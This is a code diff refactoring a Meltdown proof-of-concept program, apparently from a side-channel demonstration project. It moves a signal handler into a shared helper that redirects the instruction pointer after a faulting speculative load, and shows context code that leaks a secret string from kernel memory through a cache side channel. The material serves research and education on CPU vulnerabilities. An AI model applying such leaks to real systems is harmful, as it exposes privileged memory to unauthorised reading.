@@ -16,7 +16,7 @@
 
 #include "compiler_specifics.h"
 
-#ifndef __linux__
+#if !SAFESIDE_LINUX
 #  error Unsupported OS. Linux required.
 #endif
 
@@ -33,12 +33,9 @@
 
 #include "cache_sidechannel.h"
 #include "instr.h"
+#include "local_content.h"
+#include "meltdown_local_content.h"
 #include "utils.h"
-
-// Objective: given some control over accesses to the *non-secret* string
-// "Hello, world!", construct a program that obtains "It's a s3kr3t!!!" that is
-// stored only in the kernel memory.
-const char *public_data = "Hello, world!";
 
 // Leaks the byte that is physically located at &text[0] + offset, without
 // really loading it. In the abstract machine, and in the code executed by the
@@ -85,32 +82,6 @@ static char LeakByte(const char *data, size_t offset) {
   }
 }
 
-static void Sigsegv(
-    int /* signum */, siginfo_t * /* siginfo */, void *context) {
-  // SIGSEGV signal handler.
-  // Moves the instruction pointer to the "afterspeculation" label.
-  ucontext_t *ucontext = static_cast<ucontext_t *>(context);
-#if SAFESIDE_X64
-  ucontext->uc_mcontext.gregs[REG_RIP] =
-      reinterpret_cast<greg_t>(afterspeculation);
-#elif SAFESIDE_IA32
-  ucontext->uc_mcontext.gregs[REG_EIP] =
-      reinterpret_cast<greg_t>(afterspeculation);
-#elif SAFESIDE_PPC
-  ucontext->uc_mcontext.regs->nip =
-      reinterpret_cast<size_t>(afterspeculation);
-#else
-#  error Unsupported CPU.
-#endif
-}
-
-static void SetSignal() {
-  struct sigaction act;
-  act.sa_sigaction = Sigsegv;
-  act.sa_flags = SA_SIGINFO;
-  sigaction(SIGSEGV, &act, NULL);
-}
-
 int main() {
   size_t private_data, private_length;
   std::ifstream in("/proc/safeside_meltdown/address");
@@ -126,7 +97,7 @@ int main() {
   in >> std::dec >> private_length;
   in.close();
 
-  SetSignal();
+  OnSignalMoveRipToAfterspeculation(SIGSEGV);
   std::cout << "Leaking the string: ";
   std::cout.flush();
   const size_t private_offset =
